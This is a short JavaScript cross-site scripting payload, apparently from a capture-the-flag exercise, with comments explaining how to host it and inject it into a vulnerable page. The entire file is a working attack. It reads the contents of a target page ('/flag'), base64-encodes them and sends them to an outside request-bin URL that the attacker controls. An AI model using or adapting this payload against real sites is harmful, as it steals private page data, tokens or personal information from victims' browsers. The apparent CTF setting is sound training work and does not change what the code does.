// Spawn python server on your box and execute below js in xss vuln page.
// <script src="http://10.9.179.230:1212/steal_page_content_xss.js"></script>
var url = "https://wizbooking1.winja.org/flag";   // directory which we want from target machine
var attacker = "https://bin.graversen.io/api/9fc3f6d1-30b1-4caa-800e-7a4cd6b057e7";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);